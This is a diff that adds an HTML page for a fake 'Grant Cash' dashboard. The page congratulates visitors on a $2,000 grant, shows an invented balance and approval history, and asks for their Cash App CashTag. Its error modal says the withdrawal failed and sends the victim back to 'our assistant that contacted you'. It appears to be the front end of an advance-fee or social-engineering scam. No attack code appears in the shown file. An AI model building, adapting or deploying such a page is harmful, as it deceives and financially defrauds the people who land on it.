@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grant Cash | Dashboard</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="dashboard-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="logo">
+                <h1><span>Grant</span>Cash</h1>
+                <p>Financial Opportunities</p>
+            </div>
+            
+            <nav>
+                <ul>
+                    <li class="active"><a href="#"><i class="fas fa-home"></i> Dashboard</a></li>
+                    <li><a href="#"><i class="fas fa-history"></i> Transaction History</a></li>
+                    <li><a href="#"><i class="fas fa-user"></i> Profile</a></li>
+                    <li><a href="#"><i class="fas fa-question-circle"></i> Help</a></li>
+                    <li><a href="#" id="logout"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
+                </ul>
+            </nav>
+            
+            <div class="user-profile">
+                <div class="avatar">
+                    <i class="fas fa-user-circle"></i>
+                </div>
+                <div class="user-info">
+                    <span id="userName">Loading...</span>
+                    <span id="userEmail">user@example.com</span>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <header class="main-header">
+                <h2>Your Grant Dashboard</h2>
+                <div class="header-notification">
+                    <i class="fas fa-bell"></i>
+                    <span class="notification-badge">1</span>
+                </div>
+            </header>
+
+            <!-- Congratulations Banner -->
+            <section class="congratulations-banner">
+                <div class="banner-content">
+                    <div class="banner-icon">
+                        <i class="fas fa-trophy"></i>
+                    </div>
+                    <div class="banner-text">
+                        <h3>Congratulations, <span id="congratsName">User</span>!</h3>
+                        <p>You've been selected as a lucky recipient of our cash grant program!</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Balance Card -->
+            <section class="balance-card">
+                <div class="balance-header">
+                    <h3>Available Balance</h3>
+                    <i class="fas fa-wallet"></i>
+                </div>
+                <div class="balance-amount">
+                    $2,000.00
+                </div>
+                <button id="withdrawBtn" class="btn btn-primary">
+                    <i class="fas fa-money-bill-wave"></i> Withdraw Funds
+                </button>
+            </section>
+
+            <!-- How to Withdraw Section -->
+            <section class="withdraw-instructions">
+                <h3><i class="fas fa-info-circle"></i> How To Withdraw Your Funds</h3>
+                <div class="instructions-content">
+                    <p>You've been approved to withdraw your $2,000 grant. Here's what you need to do:</p>
+                    <ol>
+                        <li>Click the "Withdraw Funds" button above</li>
+                        <li>Enter your CashTag (e.g., $YourCashTag)</li>
+                        <li>Submit your request</li>
+                        <li>Funds will be transferred within instantly</li>
+                    </ol>
+                    <div class="note">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <p>Please ensure your CashTag is correct to avoid any transfer delays.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Recent Activity -->
+            <section class="recent-activity">
+                <h3><i class="fas fa-clock-rotate-left"></i> Recent Activity</h3>
+                <div class="activity-list">
+                    <div class="activity-item">
+                        <div class="activity-icon success">
+                            <i class="fas fa-check"></i>
+                        </div>
+                        <div class="activity-details">
+                            <h4>Grant Approved</h4>
+                            <p>Your $2,000 grant has been approved</p>
+                            <span class="activity-date">Today</span>
+                        </div>
+                        <div class="activity-amount positive">
+                            +$2,000.00
+                        </div>
+                    </div>
+                    <div class="activity-item">
+                        <div class="activity-icon">
+                            <i class="fas fa-user-plus"></i>
+                        </div>
+                        <div class="activity-details">
+                            <h4>Account Verified</h4>
+                            <p>Your account has been successfully verified</p>
+                            <span class="activity-date">Yesterday</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Withdraw Modal -->
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2><i class="fas fa-money-bill-transfer"></i> Withdraw Funds</h2>
+            <div class="modal-body">
+                <p>Enter your CashTag to receive your $2,000 grant:</p>
+                
+                <form id="withdrawForm">
+                    <div class="form-group">
+                        <label for="cashTag">Your CashTag</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-dollar-sign"></i>
+                            <input type="text" id="cashTag" placeholder="$YourCashTag" required>
+                        </div>
+                        <p class="hint">Make sure this matches your Cash App exactly</p>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="amount">Amount</label>
+                        <input type="text" id="amount" value="$2,000.00" readonly>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary btn-block">
+                        <i class="fas fa-paper-plane"></i> Submit Withdrawal
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Withdrawal Error Modal -->
+    <div id="errorModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <div class="error-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <h2>Withdrawal Error</h2>
+            <div class="modal-body">
+                <p>We encountered an issue processing your withdrawal request.</p>
+                <p>Please reach out to our assistant that contacted you to complete your transfer.</p>
+                <button id="closeErrorModal" class="btn btn-primary">
+                    <i class="fas fa-check"></i> Understood
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="dashboard.js"></script>
+</body>
+</html>
